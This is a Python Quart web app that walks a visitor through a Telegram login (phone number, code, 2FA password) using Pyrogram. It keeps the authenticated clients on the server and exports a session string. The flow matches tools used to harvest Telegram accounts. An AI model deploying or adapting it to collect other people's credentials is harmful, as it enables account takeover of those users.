from quart import Quart, render_template, request, redirect, url_for, session
import os
import re
from pyrogram import Client
from pyrogram.errors import FloodWait, PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid, SessionPasswordNeeded, PasswordHashInvalid

app = Quart(__name__)
app.secret_key = os.environ.get("SECRET_KEY")

app_id = os.environ.get("PYRO_APP_ID")
app_hash = os.environ.get("PYRO_APP_HASH")
clients = {}


@app.route('/', methods=['GET', 'POST'])
async def home():
    user_id = session.get('user_id')

    if request.method == 'POST':
        form = await request.form
        step = form.get('step')

        if step == '1':
            form = await request.form
            phone_number = form.get('phone')

            phone_regex = r'^(\+7|8)?\s?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}$'
            if re.match(phone_regex, phone_number):
                client = Client(f"user_{phone_number}", api_id=app_id, api_hash=app_hash,
                                device_model="Получаем токен, не паникуйте.")
                clients[phone_number] = client
                try:
                    await client.connect()
                    sent_phone_code = await client.send_code(phone_number)
                    session['phone_number'] = phone_number
                    session['phone_hash'] = sent_phone_code.phone_code_hash
                    session['step'] = 2
                    return redirect(url_for('home'))
                except (PhoneNumberInvalid, FloodWait) as e:
                    error_message = f"Ошибка: Введите правильный номер телефона"
                    return await render_template('index.html', step=1, error=error_message)
            else:
                error_message = "Некорректный номер телефона. Пожалуйста, введите номер в правильном формате."
                return await render_template('index.html', step=1, error=error_message)

        elif step == '2':
            form = await request.form
            telegram_code = form.get('code')
            phone_number = session.get('phone_number')
            phone_hash = session.get('phone_hash')
            client = clients.get(phone_number)
            if not client:
                return redirect(url_for('home'))

            try:
                await client.sign_in(phone_number, phone_hash, telegram_code)
                return redirect(url_for('home'))
            except (PhoneCodeInvalid, PhoneCodeExpired) as e:
                error_message = f"Ошибка: Ваш код устарел либо не действителен"
                return await render_template('index.html', step=2, error=error_message)
            except SessionPasswordNeeded:
                session['step'] = 3

        elif step == '3':
            form = await request.form
            two_fa_password = form.get('2fa')
            phone_number = session.get('phone_number')
            client = clients.get(phone_number)
            if not client:
                return redirect(url_for('home'))

            try:
                await client.check_password(two_fa_password)
                session['user_id'] = phone_number
                session['authenticated'] = True
                session['session_string'] = await client.export_session_string()
                session['step'] = 1
            except PasswordHashInvalid:
                error_message = f"Ошибка: Скорее всего пароль неправилен!"
                return await render_template('index.html', step=3, error=error_message)

    step = session.get('step', 1)
    return await render_template('index.html', step=int(step))


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
